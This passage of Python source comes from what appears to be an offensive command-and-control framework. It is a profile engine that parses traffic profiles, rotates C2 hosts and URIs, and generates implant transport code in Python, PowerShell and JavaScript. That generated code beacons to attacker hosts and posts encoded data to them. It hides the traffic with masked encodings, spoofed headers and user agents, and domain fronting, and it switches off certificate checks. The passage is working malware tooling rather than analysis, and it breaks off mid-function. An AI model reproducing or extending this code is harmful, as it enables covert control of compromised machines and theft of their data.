"""Malleable C2 profile engine: parsing, transforms, rotation, and code generation.

Runtime components (ProfileParser, ProfileTransformer, HostRotator, URIRotator) are
used by server.py to decode/encode profiled traffic.

Code-generation functions (generate_code, generate_server_handler) produce transport
snippets injected into agent templates via the {{TRANSPORT_BLOCK}} placeholder.
"""

from __future__ import annotations

import base64
import os
import random
import string
import textwrap
import threading
from dataclasses import dataclass, field
from typing import Optional

try:
    import yaml  # type: ignore[import-untyped]

    _HAS_YAML = True
except ImportError:
    _HAS_YAML = False

from evasion import EvasionConfig

# ---------------------------------------------------------------------------
# Profile directory -- lives alongside the project root
# ---------------------------------------------------------------------------

_PROJECT_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
PROFILES_DIR = os.path.join(_PROJECT_ROOT, "profiles")
PROFILES_PRIVATE_DIR = os.path.join(PROFILES_DIR, "private")

# ---------------------------------------------------------------------------
# Transform plugin registry
# ---------------------------------------------------------------------------

try:
    from transforms import registry as _transform_registry
except ImportError:
    _transform_registry = None

# ---------------------------------------------------------------------------
# Dataclasses
# ---------------------------------------------------------------------------


@dataclass
class BodyConfig:
    prepend: str = ""
    append: str = ""
    transform: str = "base64"  # base64 | base64url | hex | netbios | mask


@dataclass
class URIConfig:
    uris: list[str] = field(default_factory=lambda: ["/"])
    headers: dict[str, str] = field(default_factory=dict)
    body: BodyConfig = field(default_factory=BodyConfig)


@dataclass
class DomainFrontConfig:
    sni: str = ""
    host: str = ""


@dataclass
class HostConfig:
    strategy: str = "round-robin"  # round-robin | random | failover
    hosts: list[str] = field(default_factory=list)
    domain_fronting: Optional[DomainFrontConfig] = None


@dataclass
class SleepConfig:
    default: int = 60
    jitter: int = 25


@dataclass
class CertConfig:
    CN: str = ""
    O: str = ""


@dataclass
class Profile:
    name: str = "default"
    description: str = ""
    http_get: URIConfig = field(default_factory=URIConfig)
    http_post: URIConfig = field(default_factory=URIConfig)
    host_rotation: HostConfig = field(default_factory=HostConfig)
    user_agents: list[str] = field(default_factory=list)
    sleep: SleepConfig = field(default_factory=SleepConfig)
    https_certificate: CertConfig = field(default_factory=CertConfig)


# ---------------------------------------------------------------------------
# ProfileParser -- loads YAML from profiles/<name>.yaml
# ---------------------------------------------------------------------------


class ProfileParser:
    """Load and validate malleable C2 profile YAML files."""

    @staticmethod
    def _parse_body(raw: dict | None) -> BodyConfig:
        if not raw:
            return BodyConfig()
        return BodyConfig(
            prepend=str(raw.get("prepend", "")),
            append=str(raw.get("append", "")),
            transform=str(raw.get("transform", "base64")),
        )

    @staticmethod
    def _parse_uri_config(raw: dict | None) -> URIConfig:
        if not raw:
            return URIConfig()
        uris = raw.get("uri", ["/"])
        if isinstance(uris, str):
            uris = [uris]
        headers = dict(raw.get("headers", {}))
        body = ProfileParser._parse_body(raw.get("body"))
        return URIConfig(uris=uris, headers=headers, body=body)

    @staticmethod
    def _parse_host_config(raw: dict | None) -> HostConfig:
        if not raw:
            return HostConfig()
        df_raw = raw.get("domain-fronting") or raw.get("domain_fronting")
        df = None
        if df_raw:
            df = DomainFrontConfig(
                sni=str(df_raw.get("sni", "")),
                host=str(df_raw.get("host", "")),
            )
        return HostConfig(
            strategy=str(raw.get("strategy", "round-robin")),
            hosts=list(raw.get("hosts", [])),
            domain_fronting=df,
        )

    @staticmethod
    def load(profile_name: str) -> Profile:
        """Load a profile from ``profiles/<profile_name>.yaml``.

        Returns a default :class:`Profile` if the YAML file is missing or pyyaml
        is not installed.
        """
        if not _HAS_YAML:
            return Profile(name=profile_name)

        private_path = os.path.join(PROFILES_PRIVATE_DIR, f"{profile_name}.yaml")
        public_path = os.path.join(PROFILES_DIR, f"{profile_name}.yaml")
        path = private_path if os.path.isfile(private_path) else public_path
        if not os.path.isfile(path):
            return Profile(name=profile_name)

        with open(path, "r", encoding="utf-8") as fh:
            data = yaml.safe_load(fh) or {}

        sleep_raw = data.get("sleep", {})
        cert_raw = data.get("https-certificate") or data.get("https_certificate") or {}
        ua = data.get("user-agent") or data.get("user_agent") or []
        if isinstance(ua, str):
            ua = [ua]

        return Profile(
            name=data.get("name", profile_name),
            description=data.get("description", ""),
            http_get=ProfileParser._parse_uri_config(
                data.get("http-get") or data.get("http_get")
            ),
            http_post=ProfileParser._parse_uri_config(
                data.get("http-post") or data.get("http_post")
            ),
            host_rotation=ProfileParser._parse_host_config(
                data.get("host-rotation") or data.get("host_rotation")
            ),
            user_agents=ua,
            sleep=SleepConfig(
                default=int(sleep_raw.get("default", 60)),
                jitter=int(sleep_raw.get("jitter", 25)),
            ),
            https_certificate=CertConfig(
                CN=str(cert_raw.get("CN", "")),
                O=str(cert_raw.get("O", "")),
            ),
        )

    @staticmethod
    def resolve_placeholders(value: str, agent_id: str = "") -> str:
        """Replace ``{{AGENT_ID}}`` and ``{{RAND}}`` tokens in header values."""
        result = value.replace("{{AGENT_ID}}", agent_id)
        rand_token = "".join(random.choices(string.ascii_lowercase + string.digits, k=12))
        result = result.replace("{{RAND}}", rand_token)
        return result


# ---------------------------------------------------------------------------
# ProfileTransformer -- encode / decode the data-transform pipeline
# ---------------------------------------------------------------------------

# NetBIOS encoding table: each nibble is mapped to a character starting at 'a'.
# Byte 0x41 -> nibbles 0x4, 0x1 -> 'e', 'b' -> "eb"

def _netbios_encode(data: bytes) -> str:
    out: list[str] = []
    for b in data:
        out.append(chr(ord("a") + ((b >> 4) & 0x0F)))
        out.append(chr(ord("a") + (b & 0x0F)))
    return "".join(out)


def _netbios_decode(encoded: str) -> bytes:
    if len(encoded) % 2 != 0:
        raise ValueError("NetBIOS encoded string must have even length")
    result = bytearray()
    for i in range(0, len(encoded), 2):
        high = ord(encoded[i]) - ord("a")
        low = ord(encoded[i + 1]) - ord("a")
        if not (0 <= high <= 15 and 0 <= low <= 15):
            raise ValueError(f"Invalid NetBIOS character pair at index {i}")
        result.append((high << 4) | low)
    return bytes(result)


def _mask_encode(data: bytes) -> bytes:
    """Prepend a random XOR key byte and XOR all data bytes with it."""
    key = random.randint(1, 255)
    return bytes([key]) + bytes(b ^ key for b in data)


def _mask_decode(data: bytes) -> bytes:
    """Reverse mask encoding: first byte is key, remainder is XOR'd data."""
    if len(data) < 1:
        return b""
    key = data[0]
    return bytes(b ^ key for b in data[1:])


class ProfileTransformer:
    """Apply and reverse the data-transform pipeline defined in a profile."""

    _BUILTINS_REGISTERED = False

    @classmethod
    def _ensure_builtins(cls):
        if cls._BUILTINS_REGISTERED or _transform_registry is None:
            return
        cls._BUILTINS_REGISTERED = True
        _transform_registry.register_builtin(
            "base64",
            lambda d: base64.b64encode(d).decode("ascii"),
            lambda e: base64.b64decode(e),
        )
        _transform_registry.register_builtin(
            "base64url",
            lambda d: base64.urlsafe_b64encode(d).decode("ascii"),
            lambda e: base64.urlsafe_b64decode(e),
        )
        _transform_registry.register_builtin(
            "hex", lambda d: d.hex(), lambda e: bytes.fromhex(e)
        )
        _transform_registry.register_builtin(
            "netbios", _netbios_encode, _netbios_decode
        )
        _transform_registry.register_builtin(
            "mask",
            lambda d: base64.b64encode(_mask_encode(d)).decode("ascii"),
            lambda e: _mask_decode(base64.b64decode(e)),
        )
        _transform_registry.discover()

    @staticmethod
    def _apply_transform(data: bytes, transform: str) -> str:
        transform = transform.lower().strip()
        ProfileTransformer._ensure_builtins()
        if _transform_registry is not None:
            pair = _transform_registry.get(transform)
            if pair is not None:
                return pair[0](data)
        if transform == "base64":
            return base64.b64encode(data).decode("ascii")
        elif transform == "base64url":
            return base64.urlsafe_b64encode(data).decode("ascii")
        elif transform == "hex":
            return data.hex()
        elif transform == "netbios":
            return _netbios_encode(data)
        elif transform == "mask":
            return base64.b64encode(_mask_encode(data)).decode("ascii")
        return base64.b64encode(data).decode("ascii")

    @staticmethod
    def _reverse_transform(encoded: str, transform: str) -> bytes:
        transform = transform.lower().strip()
        ProfileTransformer._ensure_builtins()
        if _transform_registry is not None:
            pair = _transform_registry.get(transform)
            if pair is not None:
                return pair[1](encoded)
        if transform == "base64":
            return base64.b64decode(encoded)
        elif transform == "base64url":
            return base64.urlsafe_b64decode(encoded)
        elif transform == "hex":
            return bytes.fromhex(encoded)
        elif transform == "netbios":
            return _netbios_decode(encoded)
        elif transform == "mask":
            return _mask_decode(base64.b64decode(encoded))
        return base64.b64decode(encoded)

    @staticmethod
    def encode(data: bytes, body_config: BodyConfig) -> str:
        """Transform raw bytes through the profile pipeline.

        Pipeline: raw -> transform -> prepend + encoded + append
        """
        encoded = ProfileTransformer._apply_transform(data, body_config.transform)
        return body_config.prepend + encoded + body_config.append

    @staticmethod
    def decode(data: str, body_config: BodyConfig) -> bytes:
        """Reverse the profile pipeline to recover raw bytes.

        Pipeline: strip prepend/append -> reverse transform -> raw bytes
        """
        # Strip prepend
        if body_config.prepend and data.startswith(body_config.prepend):
            data = data[len(body_config.prepend):]
        # Strip append
        if body_config.append and data.endswith(body_config.append):
            data = data[: -len(body_config.append)]
        return ProfileTransformer._reverse_transform(data, body_config.transform)


# ---------------------------------------------------------------------------
# HostRotator
# ---------------------------------------------------------------------------


class HostRotator:
    """Cycle through C2 hosts using the configured rotation strategy."""

    def __init__(self, hosts: list[str], strategy: str = "round-robin") -> None:
        self._hosts = list(hosts) if hosts else ["127.0.0.1"]
        self._strategy = strategy.lower().strip()
        self._index = 0
        self._down: set[str] = set()
        self._lock = threading.Lock()

    def next(self) -> str:
        """Return the next host according to the configured strategy."""
        with self._lock:
            if self._strategy == "random":
                alive = [h for h in self._hosts if h not in self._down]
                if not alive:
                    alive = self._hosts  # all down -- reset
                return random.choice(alive)

            elif self._strategy == "failover":
                for host in self._hosts:
                    if host not in self._down:
                        return host
                # All hosts down -- reset and try first
                self._down.clear()
                return self._hosts[0]

            else:  # round-robin (default)
                host = self._hosts[self._index % len(self._hosts)]
                self._index = (self._index + 1) % len(self._hosts)
                return host

    def mark_down(self, host: str) -> None:
        """Mark a host as unavailable (used by failover strategy)."""
        with self._lock:
            self._down.add(host)

    def mark_up(self, host: str) -> None:
        """Mark a host as available again."""
        with self._lock:
            self._down.discard(host)


# ---------------------------------------------------------------------------
# URIRotator
# ---------------------------------------------------------------------------


class URIRotator:
    """Cycle through URI paths in round-robin order."""

    def __init__(self, uris: list[str]) -> None:
        self._uris = list(uris) if uris else ["/"]
        self._index = 0
        self._lock = threading.Lock()

    def next(self) -> str:
        """Return the next URI path."""
        with self._lock:
            uri = self._uris[self._index % len(self._uris)]
            self._index = (self._index + 1) % len(self._uris)
            return uri


# ===========================================================================
# CODE GENERATION (generation-time, used by agent.py)
# ===========================================================================


def generate_code(lang: str, config: EvasionConfig) -> str:
    """Generate transport code for the specified language and profile.

    Called by the evasion framework via ``evasion.profiles.generate_code(lang, config)``.
    If the profile is ``'default'``, returns empty string (agent keeps existing
    WebSocket transport).
    """
    if config.profile == "default":
        return ""

    profile = ProfileParser.load(config.profile)

    generators = {
        "python": _generate_python_transport,
        "powershell": _generate_powershell_transport,
        "javascript": _generate_javascript_transport,
        "vbscript": _generate_vbscript_transport,
    }

    generator = generators.get(lang.lower())
    if generator is None:
        return ""

    return generator(profile)


def generate_server_handler(profile_name: str) -> str:
    """Return Python code for the server-side HTTP handler that parses profiled
    requests and applies reverse transforms.

    This is used by the server integration layer to handle incoming HTTP
    traffic from profiled agents.
    """
    profile = ProfileParser.load(profile_name)
    return _generate_server_handler_code(profile)


# ---------------------------------------------------------------------------
# Python transport generation
# ---------------------------------------------------------------------------


def _generate_python_transport(profile: Profile) -> str:
    """Generate Python HTTP transport using urllib.request."""
    get_uris = repr(profile.http_get.uris)
    post_uris = repr(profile.http_post.uris)
    get_headers = repr(profile.http_get.headers)
    post_headers = repr(profile.http_post.headers)
    hosts = repr(profile.host_rotation.hosts)
    strategy = repr(profile.host_rotation.strategy)
    user_agents = repr(profile.user_agents)

    # Body config for encode/decode
    get_prepend = repr(profile.http_get.body.prepend)
    get_append = repr(profile.http_get.body.append)
    get_transform = repr(profile.http_get.body.transform)
    post_prepend = repr(profile.http_post.body.prepend)
    post_append = repr(profile.http_post.body.append)
    post_transform = repr(profile.http_post.body.transform)

    # Domain fronting
    df_sni = ""
    df_host = ""
    if profile.host_rotation.domain_fronting:
        df_sni = profile.host_rotation.domain_fronting.sni
        df_host = profile.host_rotation.domain_fronting.host

    return textwrap.dedent(f"""\
        # --- Malleable C2 HTTP Transport ({profile.name}) ---
        import urllib.request
        import urllib.error
        import base64 as _b64
        import random as _rnd
        import ssl as _ssl
        import string as _string

        _C2_GET_URIS = {get_uris}
        _C2_POST_URIS = {post_uris}
        _C2_GET_HEADERS = {get_headers}
        _C2_POST_HEADERS = {post_headers}
        _C2_HOSTS = {hosts}
        _C2_HOST_STRATEGY = {strategy}
        _C2_USER_AGENTS = {user_agents}
        _C2_GET_PREPEND = {get_prepend}
        _C2_GET_APPEND = {get_append}
        _C2_GET_TRANSFORM = {get_transform}
        _C2_POST_PREPEND = {post_prepend}
        _C2_POST_APPEND = {post_append}
        _C2_POST_TRANSFORM = {post_transform}
        _C2_DF_SNI = {repr(df_sni)}
        _C2_DF_HOST = {repr(df_host)}

        _host_idx = 0
        _get_uri_idx = 0
        _post_uri_idx = 0
        _hosts_down = set()

        def _next_host():
            global _host_idx
            if not _C2_HOSTS:
                return C2_HOST
            if _C2_HOST_STRATEGY == "random":
                alive = [h for h in _C2_HOSTS if h not in _hosts_down]
                return _rnd.choice(alive if alive else _C2_HOSTS)
            elif _C2_HOST_STRATEGY == "failover":
                for h in _C2_HOSTS:
                    if h not in _hosts_down:
                        return h
                _hosts_down.clear()
                return _C2_HOSTS[0]
            else:
                h = _C2_HOSTS[_host_idx % len(_C2_HOSTS)]
                _host_idx = (_host_idx + 1) % len(_C2_HOSTS)
                return h

        def _next_get_uri():
            global _get_uri_idx
            u = _C2_GET_URIS[_get_uri_idx % len(_C2_GET_URIS)]
            _get_uri_idx = (_get_uri_idx + 1) % len(_C2_GET_URIS)
            return u

        def _next_post_uri():
            global _post_uri_idx
            u = _C2_POST_URIS[_post_uri_idx % len(_C2_POST_URIS)]
            _post_uri_idx = (_post_uri_idx + 1) % len(_C2_POST_URIS)
            return u

        def _apply_transform(data, transform):
            if transform == "base64":
                return _b64.b64encode(data).decode()
            elif transform == "base64url":
                return _b64.urlsafe_b64encode(data).decode()
            elif transform == "hex":
                return data.hex()
            elif transform == "netbios":
                o = []
                for b in data:
                    o.append(chr(ord('a') + ((b >> 4) & 0x0F)))
                    o.append(chr(ord('a') + (b & 0x0F)))
                return ''.join(o)
            elif transform == "mask":
                k = _rnd.randint(1, 255)
                masked = bytes([k]) + bytes(b ^ k for b in data)
                return _b64.b64encode(masked).decode()
            return _b64.b64encode(data).decode()

        def _reverse_transform(encoded, transform):
            if transform == "base64":
                return _b64.b64decode(encoded)
            elif transform == "base64url":
                return _b64.urlsafe_b64decode(encoded)
            elif transform == "hex":
                return bytes.fromhex(encoded)
            elif transform == "netbios":
                r = bytearray()
                for i in range(0, len(encoded), 2):
                    hi = ord(encoded[i]) - ord('a')
                    lo = ord(encoded[i+1]) - ord('a')
                    r.append((hi << 4) | lo)
                return bytes(r)
            elif transform == "mask":
                raw = _b64.b64decode(encoded)
                k = raw[0]
                return bytes(b ^ k for b in raw[1:])
            return _b64.b64decode(encoded)

        def _resolve_hdrs(hdrs, agent_id=""):
            resolved = {{}}
            for k, v in hdrs.items():
                v = v.replace("{{{{AGENT_ID}}}}", agent_id)
                v = v.replace("{{{{RAND}}}}", ''.join(_rnd.choices(_string.ascii_lowercase + _string.digits, k=12)))
                resolved[k] = v
            if _C2_USER_AGENTS:
                resolved["User-Agent"] = _rnd.choice(_C2_USER_AGENTS)
            if _C2_DF_HOST:
                resolved["Host"] = _C2_DF_HOST
            return resolved

        def _build_url(host, uri):
            scheme = "https" if C2_PORT == 443 else "http"
            port_str = "" if C2_PORT in (80, 443) else f":{{C2_PORT}}"
            return f"{{scheme}}://{{host}}{{port_str}}{{uri}}"

        def _make_ssl_context():
            ctx = _ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = _ssl.CERT_NONE
            return ctx

        def transport_send(data, agent_id=""):
            host = _next_host()
            uri = _next_post_uri()
            url = _build_url(host, uri)
            encoded = _C2_POST_PREPEND + _apply_transform(data, _C2_POST_TRANSFORM) + _C2_POST_APPEND
            hdrs = _resolve_hdrs(_C2_POST_HEADERS, agent_id)
            req = urllib.request.Request(url, data=encoded.encode(), headers=hdrs, method="POST")
            try:
                ctx = _make_ssl_context()
                resp = urllib.request.urlopen(req, context=ctx, timeout=30)
                body = resp.read().decode()
                if body:
                    return _reverse_transform(
                        body[len(_C2_GET_PREPEND):len(body)-len(_C2_GET_APPEND)] if _C2_GET_PREPEND or _C2_GET_APPEND else body,
                        _C2_GET_TRANSFORM
                    )
            except Exception:
                if _C2_HOST_STRATEGY == "failover":
                    _hosts_down.add(host)
            return None

        def transport_recv(agent_id=""):
            host = _next_host()
            uri = _next_get_uri()
            url = _build_url(host, uri)
            hdrs = _resolve_hdrs(_C2_GET_HEADERS, agent_id)
            req = urllib.request.Request(url, headers=hdrs, method="GET")
            try:
                ctx = _make_ssl_context()
                resp = urllib.request.urlopen(req, context=ctx, timeout=30)
                body = resp.read().decode()
                if body:
                    stripped = body
                    if _C2_GET_PREPEND and stripped.startswith(_C2_GET_PREPEND):
                        stripped = stripped[len(_C2_GET_PREPEND):]
                    if _C2_GET_APPEND and stripped.endswith(_C2_GET_APPEND):
                        stripped = stripped[:-len(_C2_GET_APPEND)]
                    return _reverse_transform(stripped, _C2_GET_TRANSFORM)
            except Exception:
                if _C2_HOST_STRATEGY == "failover":
                    _hosts_down.add(host)
            return None
    """)


# ---------------------------------------------------------------------------
# PowerShell transport generation
# ---------------------------------------------------------------------------


def _generate_powershell_transport(profile: Profile) -> str:
    """Generate PowerShell HTTP transport using Invoke-WebRequest / System.Net.WebClient."""
    get_uris = ", ".join(f"'{u}'" for u in profile.http_get.uris)
    post_uris = ", ".join(f"'{u}'" for u in profile.http_post.uris)

    get_headers_ps = _dict_to_ps_hashtable(profile.http_get.headers)
    post_headers_ps = _dict_to_ps_hashtable(profile.http_post.headers)
    hosts_ps = ", ".join(f"'{h}'" for h in profile.host_rotation.hosts)
    ua_ps = ", ".join(f"'{u}'" for u in profile.user_agents)

    df_sni = ""
    df_host = ""
    if profile.host_rotation.domain_fronting:
        df_sni = profile.host_rotation.domain_fronting.sni
        df_host = profile.host_rotation.domain_fronting.host

    return textwrap.dedent(f"""\
        # --- Malleable C2 HTTP Transport ({profile.name}) ---
        $C2GetURIs = @({get_uris})
        $C2PostURIs = @({post_uris})
        $C2GetHeaders = {get_headers_ps}
        $C2PostHeaders = {post_headers_ps}
        $C2Hosts = @({hosts_ps})
        $C2UserAgents = @({ua_ps})
        $C2HostStrategy = '{profile.host_rotation.strategy}'
        $C2GetPrepend = '{_ps_escape(profile.http_get.body.prepend)}'
        $C2GetAppend = '{_ps_escape(profile.http_get.body.append)}'
        $C2GetTransform = '{profile.http_get.body.transform}'
        $C2PostPrepend = '{_ps_escape(profile.http_post.body.prepend)}'
        $C2PostAppend = '{_ps_escape(profile.http_post.body.append)}'
        $C2PostTransform = '{profile.http_post.body.transform}'
        $C2DfSni = '{df_sni}'
        $C2DfHost = '{df_host}'
        $script:hostIdx = 0
        $script:getUriIdx = 0
        $script:postUriIdx = 0
        $script:hostsDown = @{{}}

        # Disable certificate validation for self-signed certs
        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {{$true}}

        function Get-NextHost {{
            if ($C2Hosts.Count -eq 0) {{ return $C2Host }}
            switch ($C2HostStrategy) {{
                'random' {{
                    $alive = $C2Hosts | Where-Object {{ -not $script:hostsDown[$_] }}
                    if (-not $alive) {{ $alive = $C2Hosts }}
                    return ($alive | Get-Random)
                }}
                'failover' {{
                    foreach ($h in $C2Hosts) {{
                        if (-not $script:hostsDown[$h]) {{ return $h }}
                    }}
                    $script:hostsDown = @{{}}
                    return $C2Hosts[0]
                }}
                default {{
                    $h = $C2Hosts[$script:hostIdx % $C2Hosts.Count]
                    $script:hostIdx = ($script:hostIdx + 1) % $C2Hosts.Count
                    return $h
                }}
            }}
        }}

        function Get-NextGetUri {{
            $u = $C2GetURIs[$script:getUriIdx % $C2GetURIs.Count]
            $script:getUriIdx = ($script:getUriIdx + 1) % $C2GetURIs.Count
            return $u
        }}

        function Get-NextPostUri {{
            $u = $C2PostURIs[$script:postUriIdx % $C2PostURIs.Count]
            $script:postUriIdx = ($script:postUriIdx + 1) % $C2PostURIs.Count
            return $u
        }}

        function Invoke-Transform([byte[]]$Data, [string]$Transform) {{
            switch ($Transform) {{
                'base64'    {{ return [Convert]::ToBase64String($Data) }}
                'base64url' {{
                    $b = [Convert]::ToBase64String($Data)
                    return $b.Replace('+','-').Replace('/','_')
                }}
                'hex'       {{ return [BitConverter]::ToString($Data).Replace('-','').ToLower() }}
                'netbios'   {{
                    $sb = [System.Text.StringBuilder]::new($Data.Length * 2)
                    foreach ($b in $Data) {{
                        [void]$sb.Append([char]([int][char]'a' + (($b -shr 4) -band 0x0F)))
                        [void]$sb.Append([char]([int][char]'a' + ($b -band 0x0F)))
                    }}
                    return $sb.ToString()
                }}
                'mask'      {{
                    $k = Get-Random -Minimum 1 -Maximum 256
                    $masked = [byte[]]::new($Data.Length + 1)
                    $masked[0] = [byte]$k
                    for ($i=0; $i -lt $Data.Length; $i++) {{ $masked[$i+1] = $Data[$i] -bxor $k }}
                    return [Convert]::ToBase64String($masked)
                }}
                default     {{ return [Convert]::ToBase64String($Data) }}
            }}
        }}

        function Invoke-ReverseTransform([string]$Encoded, [string]$Transform) {{
            switch ($Transform) {{
                'base64'    {{ return [Convert]::FromBase64String($Encoded) }}
                'base64url' {{
                    $b = $Encoded.Replace('-','+').Replace('_','/')
                    switch ($b.Length % 4) {{ 2 {{ $b += '==' }}; 3 {{ $b += '=' }} }}
                    return [Convert]::FromBase64String($b)
                }}
                'hex'       {{
                    $bytes = [byte[]]::new($Encoded.Length / 2)
                    for ($i=0; $i -lt $Encoded.Length; $i+=2) {{
                        $bytes[$i/2] = [Convert]::ToByte($Encoded.Substring($i,2), 16)
                    }}
                    return $bytes
                }}
                'netbios'   {{
                    $bytes = [byte[]]::new($Encoded.Length / 2)
                    for ($i=0; $i -lt $Encoded.Length; $i+=2) {{
                        $hi = [int][char]$Encoded[$i] - [int][char]'a'
                        $lo = [int][char]$Encoded[$i+1] - [int][char]'a'
                        $bytes[$i/2] = [byte](($hi -shl 4) -bor $lo)
                    }}
                    return $bytes
                }}
                'mask'      {{
                    $raw = [Convert]::FromBase64String($Encoded)
                    $k = $raw[0]
                    $result = [byte[]]::new($raw.Length - 1)
                    for ($i=1; $i -lt $raw.Length; $i++) {{ $result[$i-1] = $raw[$i] -bxor $k }}
                    return $result
                }}
                default     {{ return [Convert]::FromBase64String($Encoded) }}
            }}
        }}

        function Resolve-Headers([hashtable]$Headers, [string]$AgentId) {{
            $resolved = @{{}}
            foreach ($k in $Headers.Keys) {{
                $v = $Headers[$k] -replace '\\{{\\{{AGENT_ID\\}}\\}}', $AgentId
                $rand = -join ((97..122) + (48..57) | Get-Random -Count 12 | ForEach-Object {{ [char]$_ }})
                $v = $v -replace '\\{{\\{{RAND\\}}\\}}', $rand
                $resolved[$k] = $v
            }}
            if ($C2UserAgents.Count -gt 0) {{
                $resolved['User-Agent'] = $C2UserAgents | Get-Random
            }}
            if ($C2DfHost) {{ $resolved['Host'] = $C2DfHost }}
            return $resolved
        }}

        function Send-C2Data([byte[]]$Data, [string]$AgentId) {{
            $host_ = Get-NextHost
            $uri = Get-NextPostUri
            $scheme = if ($C2Port -eq 443) {{ 'https' }} else {{ 'http' }}
            $portStr = if ($C2Port -in 80,443) {{ '' }} else {{ ":$C2Port" }}
            $url = "${{scheme}}://${{host_}}${{portStr}}${{uri}}"
            $encoded = $C2PostPrepend + (Invoke-Transform $Data $C2PostTransform) + $C2PostAppend
            $hdrs = Resolve-Headers $C2PostHeaders $AgentId
            try {{
                $wc = New-Object System.Net.WebClient
                foreach ($k in $hdrs.Keys) {{ $wc.Headers.Add($k, $hdrs[$k]) }}
                $resp = $wc.UploadString($url, $encoded)
                if ($resp) {{
                    $stripped = $resp
                    if ($C2GetPrepend -and $stripped.StartsWith($C2GetPrepend)) {{
                        $stripped = $stripped.Substring($C2GetPrepend.Length)
                    }}
                    if ($C2GetAppend -and $stripped.EndsWith($C2GetAppend)) {{
                        $stripped = $stripped.Substring(0, $stripped.Length - $C2GetAppend.Length)
                    }}
                    return Invoke-ReverseTransform $stripped $C2GetTransform
                }}
            }} catch {{
                if ($C2HostStrategy -eq 'failover') {{ $script:hostsDown[$host_] = $true }}
            }}
            return $null
        }}

        function Receive-C2Data([string]$AgentId) {{
            $host_ = Get-NextHost
            $uri = Get-NextGetUri
            $scheme = if ($C2Port -eq 443) {{ 'https' }} else {{ 'http' }}
            $portStr = if ($C2Port -in 80,443) {{ '' }} else {{ ":$C2Port" }}
            $url = "${{scheme}}://${{host_}}${{portStr}}${{uri}}"
            $hdrs = Resolve-Headers $C2GetHeaders $AgentId
            try {{
                $wc = New-Object System.Net.WebClient
                foreach ($k in $hdrs.Keys) {{ $wc.Headers.Add($k, $hdrs[$k]) }}
                $resp = $wc.DownloadString($url)
                if ($resp) {{
                    $stripped = $resp
                    if ($C2GetPrepend -and $stripped.StartsWith($C2GetPrepend)) {{
                        $stripped = $stripped.Substring($C2GetPrepend.Length)
                    }}
                    if ($C2GetAppend -and $stripped.EndsWith($C2GetAppend)) {{
                        $stripped = $stripped.Substring(0, $stripped.Length - $C2GetAppend.Length)
                    }}
                    return Invoke-ReverseTransform $stripped $C2GetTransform
                }}
            }} catch {{
                if ($C2HostStrategy -eq 'failover') {{ $script:hostsDown[$host_] = $true }}
            }}
            return $null
        }}
    """)


# ---------------------------------------------------------------------------
# JavaScript transport generation
# ---------------------------------------------------------------------------


def _generate_javascript_transport(profile: Profile) -> str:
    """Generate Node.js HTTP transport using built-in http/https modules."""
    get_uris = repr(profile.http_get.uris)
    post_uris = repr(profile.http_post.uris)
    hosts = repr(profile.host_rotation.hosts)

    get_headers_js = _dict_to_js_object(profile.http_get.headers)
    post_headers_js = _dict_to_js_object(profile.http_post.headers)

    df_sni = ""
    df_host = ""
    if profile.host_rotation.domain_fronting:
        df_sni = profile.host_rotation.domain_fronting.sni
        df_host = profile.host_rotation.domain_fronting.host

    return textwrap.dedent(f"""\
        // --- Malleable C2 HTTP Transport ({profile.name}) ---
        const _http = require('http');
        const _https = require('https');

        const _C2_GET_URIS = {get_uris};
        const _C2_POST_URIS = {post_uris};
        const _C2_GET_HEADERS = {get_headers_js};
        const _C2_POST_HEADERS = {post_headers_js};
        const _C2_HOSTS = {hosts};
        const _C2_HOST_STRATEGY = '{profile.host_rotation.strategy}';
        const _C2_USER_AGENTS = {repr(profile.user_agents)};
        const _C2_GET_PREPEND = {repr(profile.http_get.body.prepend)};
        const _C2_GET_APPEND = {repr(profile.http_get.body.append)};
        const _C2_GET_TRANSFORM = '{profile.http_get.body.transform}';
        const _C2_POST_PREPEND = {repr(profile.http_post.body.prepend)};
        const _C2_POST_APPEND = {repr(profile.http_post.body.append)};
        const _C2_POST_TRANSFORM = '{profile.http_post.body.transform}';
        const _C2_DF_SNI = '{_js_escape(df_sni)}';
        const _C2_DF_HOST = '{_js_escape(df_host)}';

        let _hostIdx = 0, _getUriIdx = 0, _postUriIdx = 0;
        const _hostsDown = new Set();

        function _nextHost() {{
            if (!_C2_HOSTS.length) return C2_HOST;
            if (_C2_HOST_STRATEGY === 'random') {{
                const alive = _C2_HOSTS.filter(h => !_hostsDown.has(h));
                const pool = alive.length ? alive : _C2_HOSTS;
                return pool[Math.floor(Math.random() * pool.length)];
            }} else if (_C2_HOST_STRATEGY === 'failover') {{
                for (const h of _C2_HOSTS) if (!_hostsDown.has(h)) return h;
                _hostsDown.clear();
                return _C2_HOSTS[0];
            }}
            const h = _C2_HOSTS[_hostIdx % _C2_HOSTS.length];
            _hostIdx = (_hostIdx + 1) % _C2_HOSTS.length;
            return h;
        }}

        function _nextGetUri() {{
            const u = _C2_GET_URIS[_getUriIdx % _C2_GET_URIS.length];
            _getUriIdx = (_getUriIdx + 1) % _C2_GET_URIS.length;
            return u;
        }}

        function _nextPostUri() {{
            const u = _C2_POST_URIS[_postUriIdx % _C2_POST_URIS.length];
            _postUriIdx = (_postUriIdx + 1) % _C2_POST_URIS.length;
            return u;
        }}

        function _applyTransform(buf, transform) {{
            switch (transform) {{
                case 'base64': return buf.toString('base64');
                case 'base64url': return buf.toString('base64url');
                case 'hex': return buf.toString('hex');
                case 'netbios': {{
                    let o = '';
                    for (const b of buf) {{
                        o += String.fromCharCode(97 + ((b >> 4) & 0x0F));
                        o += String.fromCharCode(97 + (b & 0x0F));
                    }}
                    return o;
                }}
                case 'mask': {{
                    const k = Math.floor(Math.random() * 255) + 1;
                    const masked = Buffer.alloc(buf.length + 1);
                    masked[0] = k;
                    for (let i = 0; i < buf.length; i++) masked[i+1] = buf[i] ^ k;
                    return masked.toString('base64');
                }}
                default: return buf.toString('base64');
            }}
        }}

        function _reverseTransform(encoded, transform) {{
            switch (transform) {{
                case 'base64': return Buffer.from(encoded, 'base64');
                case 'base64url': return Buffer.from(encoded, 'base64url');
                case 'hex': return Buffer.from(encoded, 'hex');
                case 'netbios': {{
                    const bytes = [];
                    for (let i = 0; i < encoded.length; i += 2) {{
                        const hi = encoded.charCodeAt(i) - 97;
                        const lo = encoded.charCodeAt(i+1) - 97;
                        bytes.push((hi << 4) | lo);
                    }}
                    return Buffer.from(bytes);
                }}
                case 'mask': {{
                    const raw = Buffer.from(encoded, 'base64');
                    const k = raw[0];
